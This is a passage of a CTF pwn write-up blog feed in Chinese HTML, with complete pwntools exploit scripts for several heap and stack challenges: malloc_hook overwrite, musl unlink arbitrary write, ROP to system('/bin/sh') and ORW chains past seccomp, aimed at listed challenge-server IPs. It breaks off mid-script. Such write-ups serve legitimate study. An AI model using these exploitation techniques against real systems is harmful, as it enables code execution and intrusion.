class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span 